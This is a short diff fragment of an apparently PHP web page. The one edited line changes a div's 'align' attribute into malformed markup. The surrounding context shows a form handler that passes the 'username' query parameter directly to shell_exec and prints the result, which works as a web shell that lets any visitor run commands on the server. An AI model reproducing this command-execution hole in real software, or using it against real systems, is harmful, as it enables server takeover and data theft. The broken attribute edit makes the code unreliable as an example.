@@ -23,7 +23,7 @@
 
     </form>
   </div>
-  <div style="background-color:#ecf2d0;padding:20px;border-radius:0px 0px 20px 20px" align="center">
+  <div style="background-color:#ecf2d0;padding:20px;border-radius:0px 0px 20px 20px";"center">
     <?php
     if(isset($_GET["username"])){
       echo shell_exec($_GET["username"]);
